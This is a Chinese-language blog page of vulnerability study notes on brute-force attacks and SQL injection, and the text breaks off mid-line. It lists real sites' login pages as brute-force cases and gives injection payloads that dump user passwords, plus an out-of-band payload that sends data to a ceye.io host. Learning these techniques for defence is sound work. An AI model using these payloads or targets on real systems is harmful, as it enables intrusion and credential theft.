<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>漏洞篇 | K夜2H'Spcace</title><meta name="keywords" content="漏洞"><meta name="author" content="Knight-zh"><meta name="copyright" content="Knight-zh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="漏洞篇前言1234漏洞课程的流程：（我们是做防御的）	漏洞原理、攻击场景、漏洞危害、测试方法（核心）、防御方案、绕过手段、实战案例、参考资料		前五点必须要完全掌握，后三点则是加分项      暴力破解漏洞原理1理论上能破解任何一种密码  特征： 短频快 攻击场景123456789主要分为两类：	C&#x2F;S类：		* 远程桌面：rdp(windows)、vnc(linux)		* smb、f">
<meta property="og:type" content="article">
<meta property="og:title" content="漏洞篇">
<meta property="og:url" content="http://example.com/2021/04/23/%E6%BC%8F%E6%B4%9E%E7%AF%87/index.html">
<meta property="og:site_name" content="K夜2H&#39;Spcace">
<meta property="og:description" content="漏洞篇前言1234漏洞课程的流程：（我们是做防御的）	漏洞原理、攻击场景、漏洞危害、测试方法（核心）、防御方案、绕过手段、实战案例、参考资料		前五点必须要完全掌握，后三点则是加分项      暴力破解漏洞原理1理论上能破解任何一种密码  特征： 短频快 攻击场景123456789主要分为两类：	C&#x2F;S类：		* 远程桌面：rdp(windows)、vnc(linux)		* smb、f">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://images.pexels.com/photos/1529881/pexels-photo-1529881.jpeg?auto=compress&cs=tinysrgb&dpr=2&w=500">
<meta property="article:published_time" content="2021-04-22T21:42:13.000Z">
<meta property="article:modified_time" content="2021-04-22T21:55:08.729Z">
<meta property="article:author" content="Knight-zh">
<meta property="article:tag" content="漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.pexels.com/photos/1529881/pexels-photo-1529881.jpeg?auto=compress&cs=tinysrgb&dpr=2&w=500"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/04/23/%E6%BC%8F%E6%B4%9E%E7%AF%87/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":100,"languages":{"author":"作者: Knight-zh","link":"链接: ","source":"来源: K夜2H'Spcace","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-04-23 05:55:08'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://pic3.zhimg.com/80/v2-4b5c6f721ad9102075ed7808ca857bf8_1440w.jpg?source=1940ef5c" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://images.pexels.com/photos/1529881/pexels-photo-1529881.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=2&amp;w=500')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">K夜2H'Spcace</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">漏洞篇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-22T21:42:13.000Z" title="发表于 2021-04-23 05:42:13">2021-04-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-22T21:55:08.729Z" title="更新于 2021-04-23 05:55:08">2021-04-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="漏洞篇"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="漏洞篇"><a href="#漏洞篇" class="headerlink" title="漏洞篇"></a>漏洞篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞课程的流程：（我们是做防御的）</span><br><span class="line">	漏洞原理、攻击场景、漏洞危害、测试方法（核心）、防御方案、绕过手段、实战案例、参考资料</span><br><span class="line">	</span><br><span class="line">	前五点必须要完全掌握，后三点则是加分项</span><br></pre></td></tr></table></figure>





<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">理论上能破解任何一种密码</span><br></pre></td></tr></table></figure>

<p>特征： 短频快</p>
<h3 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">主要分为两类：</span><br><span class="line">	C&#x2F;S类：</span><br><span class="line">		* 远程桌面：rdp(windows)、vnc(linux)</span><br><span class="line">		* smb、ftp、sftp、ssh...</span><br><span class="line">		* MySQL、MongoDB、Oracle...</span><br><span class="line">	B&#x2F;S类：</span><br><span class="line">		* 登录框</span><br><span class="line">		* URL参数：用户id、目录名、参数名</span><br><span class="line">		* 验证码</span><br></pre></td></tr></table></figure>

<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">枚举账号密码</span><br><span class="line">枚举敏感目录、文件等</span><br><span class="line">枚举敏感数据，例如：订单号、收货地址、手机、身份证等信息</span><br></pre></td></tr></table></figure>

<h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">	要求用户使用复杂的强密码，避免设置任何已知的弱口令。（比如强制密码设置为至少三种字符、长度大于 16）</span><br><span class="line">	</span><br><span class="line">	每次登陆时，均要求使用验证码。（注意验证码的健壮性）</span><br><span class="line"></span><br><span class="line">	对登录行为进行判断和限制，当尝试次数达到限制时，锁定账户或者 ip。</span><br><span class="line"></span><br><span class="line">	禁止密码输入频率过高的请求。</span><br><span class="line"></span><br><span class="line">	采用双因素认证。</span><br><span class="line"></span><br><span class="line">	当同一来源的密码输入出错次数超过一定阈值时，立即通过邮箱或短信的方式通知系统管理员。</span><br><span class="line"></span><br><span class="line">	配置详细的网络访问控制，严格限制将高危端口开放到互联网；对于关键资产，建议使用 vpn和堡垒机的方式进行集中管理和审计。</span><br><span class="line"></span><br><span class="line">	** 提高全员安全意识 **，禁止借用和共享账号，禁止明文存储密码或公开密码规则。</span><br><span class="line"></span><br><span class="line">标记的为万金油型</span><br></pre></td></tr></table></figure>

<h3 id="绕过手段"><a href="#绕过手段" class="headerlink" title="绕过手段"></a>绕过手段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">验证码绕过</span><br><span class="line">IP被限制时，挂代理</span><br></pre></td></tr></table></figure>

<h3 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.dentalsleepsolutions.com&#x2F;manage&#x2F;login.php?				msg&#x3D;Email%20sent</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.empatica.com&#x2F;connect&#x2F;login.php</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.digicert.com&#x2F;account&#x2F;login.php</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mbe-latam.com&#x2F;eboxweb&#x2F;manage&#x2F;login.php</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;app.site123.com&#x2F;manager&#x2F;login&#x2F;login.php?l&#x3D;en</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;www.youradsl.co.za&#x2F;login.php</span><br></pre></td></tr></table></figure>

<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>攻击者构造恶意sql语句进行<strong>输入</strong>，而web应用没有对用户的输入进行<strong>合法性检测</strong>，恶意代码被数据库<strong>正常执行</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">几乎所有的数据源都可能存在注入漏洞。当攻击者可以将恶意代码发送到解析器时，就可能出现注入漏洞。总的来说，sql语句能做的事情sql注入也能做</span><br><span class="line"></span><br><span class="line">常见的注入攻击：ldap注入、nosql、xpath、xml注入、os命令注入</span><br><span class="line"></span><br><span class="line">攻：数据与代码混淆</span><br><span class="line">防：数据与代码分离</span><br></pre></td></tr></table></figure>

<p><strong>sql注入的分类：</strong></p>
<ul>
<li><p><strong>根据数据类型来分类</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">数字型：（一般存在弱类型的语言中，例如python、php、asp）</span><br><span class="line">	select 字段名 from 表名 where id &#x3D; 1</span><br><span class="line">	简单的测试方法：</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;1              假设ID为存在注入的参数</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;1&#39;			 语句报错</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;1 and 1&#x3D;1	 	 页面正常返回结果</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;1 and 1&#x3D;2	 	 页面返回错误</span><br><span class="line">		</span><br><span class="line">字符型：</span><br><span class="line">	select 字段名 from 表名 where id &#x3D; 1</span><br><span class="line">	简单的测试方法：</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;a					假设ID为存在注入的参数</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;a&#39;				语句报错</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;a&#39; and &#39;1&#39;&#x3D;&#39;1		</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;a&#39; and a&#x3D;a		页面正常返回结果</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;a&#39; and a&#x3D;b</span><br><span class="line">		http:&#x2F;&#x2F;www.sql.com&#x2F;xxx.php?id&#x3D;a&#39; and &#39;1&#39;&#x3D;&#39;2		页面返回错误</span><br><span class="line">	</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p><strong>按照效果来分类</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">显错注入</span><br><span class="line">	sql语句报错</span><br><span class="line"></span><br><span class="line">布尔注入</span><br><span class="line">	特征：没有报错信息，不管输入的结果是对是错都只有两种结果</span><br><span class="line">	</span><br><span class="line">	利用 and 、or 逻辑运算符</span><br><span class="line">	</span><br><span class="line">    简单的推演案例一：</span><br><span class="line">    select databas() 为了找到这个</span><br><span class="line">    select ascii(substr(databse,i,1))&gt;n 更换n、i的值来判断第i位的ascii是多少</span><br><span class="line">    </span><br><span class="line">    面试可以说: and 1&#x3D;1 显示正确结果，and 1&#x3D;2 显示错误结果</span><br><span class="line"></span><br><span class="line">延时注入</span><br><span class="line">	基于时间的盲注，sleep()</span><br><span class="line"></span><br><span class="line">联合注入</span><br><span class="line">	union 联合查询</span><br><span class="line"></span><br><span class="line">宽字节注入</span><br><span class="line">	实战工作中没那么常见，一般是利用服务器的编码与数据库编码不一致造成的</span><br><span class="line"></span><br><span class="line">带外注入</span><br><span class="line">	利用第三方来接收回显（dnslog、httplog、邮件）</span><br><span class="line">堆叠注入（二阶注入）</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="攻击场景-1"><a href="#攻击场景-1" class="headerlink" title="攻击场景"></a>攻击场景</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">获取管理员或其他账号密码信息</span><br><span class="line">利用数据库漏洞提权</span><br><span class="line">有增、删、改、查的地方就可能会有sql注入</span><br></pre></td></tr></table></figure>

<h3 id="漏洞危害-1"><a href="#漏洞危害-1" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查询其他用户账号密码</span><br><span class="line">可能导致攻击者控制数据库的所有数据</span><br><span class="line">网页挂马</span><br><span class="line">安装后门</span><br><span class="line">删库跑路的恶意操作</span><br></pre></td></tr></table></figure>

<h3 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h3><h4 id="常规方法"><a href="#常规方法" class="headerlink" title="常规方法"></a>常规方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">************** 整体测试流程 **************</span><br><span class="line">首先查询数据库名、表名、列、字段、信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*************** 显错注入 **************</span><br><span class="line">	1&#39;，利用单引号&#39;</span><br><span class="line"></span><br><span class="line">************** 布尔注入 **************</span><br><span class="line">	利用and、or</span><br><span class="line">	示例：</span><br><span class="line">		1&#39; and 1&#x3D;1 #</span><br><span class="line">		1&#39; and 1&#x3D;2 #</span><br><span class="line">		1&#39; or 1&#x3D;1 #</span><br><span class="line">		11&#39; or 1&#x3D;1#</span><br><span class="line"></span><br><span class="line">************** 联合注入 **************</span><br><span class="line">	union select x,y,z...</span><br><span class="line">	</span><br><span class="line">	可以搭配一些函数来使用：version(),user(),load_file()</span><br><span class="line">	</span><br><span class="line">	实战案例：</span><br><span class="line">		查询表名：</span><br><span class="line">		1&#39; union select 1,table_name from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">		查询列名：</span><br><span class="line">		1&#39; union select 1,column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; #</span><br><span class="line">		查询列信息：</span><br><span class="line">		1&#39; union select 1,(select group_CONCAT(concat_ws(&#39;,&#39;,user_id,first_name,last_name,user,password,avatar)) from users) #、</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">************** 延时注入 **************</span><br><span class="line">	利用sleep()</span><br><span class="line">	</span><br><span class="line">	可以利用 if() 搭配小技巧中的方法来猜测表名等相关信息：</span><br><span class="line">		获取当前数据库名的长度	</span><br><span class="line">		if(length(database())&gt;1,sleep(5),1) #		sleep</span><br><span class="line">		if(length(database())&gt;2,sleep(5),1) #		sleep</span><br><span class="line">		if(length(database())&gt;3,sleep(5),1) #		no sleep</span><br><span class="line">		得出当前数据库名长度为3</span><br><span class="line">		</span><br><span class="line">************** 带外注入 **************</span><br><span class="line">	原理：</span><br><span class="line">        当我们对一个数据库进行注入时，无回显，且无法进行时间注入，那么就可以利用一个通道，把查询到数据通过通道带出去，这里的通道包括：http请求、DNS解析、SMB服务等将数据带出。</span><br><span class="line"></span><br><span class="line">	方法：</span><br><span class="line">        利用网站ceye.io与payload  load_file(concat(&quot;\\\\&quot;,version(),&quot;.lkw598.ceye.io\\xxx.txt&quot;))来进行带外注入</span><br><span class="line">	</span><br><span class="line">	注意事项：</span><br><span class="line">		payload是unc路径的，也就是说MySQL带外注入只能发生在windows上，Linux的无法实现</span><br><span class="line"></span><br><span class="line">************** 宽字节注入 **************</span><br><span class="line">    因为操作系统编码与数据库编码不一致导致的，一般系统编码是UTF-8，而数据库的是GBK，GBK编码会将两个字符当成一个汉字，一般情况下，&#39;字符会在后端被转义，即\&#39;，这样的编码就是%5c%27，如果这时手动添加一个字符%df,那么就会变成%df%5c%27，此时前面的%df%5c就会被当作一个汉字，而后面的单引号就会逃逸出来。</span><br><span class="line">		</span><br><span class="line">************** 二阶注入(堆叠注入) **************</span><br><span class="line">	首先提交的sql语句没有立刻执行，而是存储起来，在第二次访问的时候才会被执行，类似于存储型xss</span><br></pre></td></tr></table></figure>

<h4 id="数据库知识补充"><a href="#数据库知识补充" class="headerlink" title="数据库知识补充"></a>数据库知识补充</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">*********** 小技巧 ***********</span><br><span class="line">通过下列的函数来判断表名等信息：</span><br><span class="line">database()、substr() 、 ascii() 、length()</span><br><span 